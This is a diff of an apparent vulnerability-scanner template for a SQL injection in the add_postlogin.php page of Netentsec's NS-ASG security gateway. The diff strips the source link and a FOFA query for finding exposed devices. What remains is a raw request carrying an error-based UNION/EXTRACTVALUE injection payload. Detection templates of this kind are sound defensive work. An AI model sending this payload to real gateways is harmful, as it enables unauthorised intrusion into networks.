@@ -3,12 +3,8 @@ info:
   name: 网康科技 NS-ASG 应用安全网关 add_postlogin.php SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fwxl7dbli8lyv2rc'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fwxl7dbli8lyv2rc
-    fofa: app="网康科技-NS-ASG安全网关"
 http:
 - raw:
   - 'GET /admin/add_postlogin.php?SingleLoginId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5(666)),0x7e)) HTTP/1.1
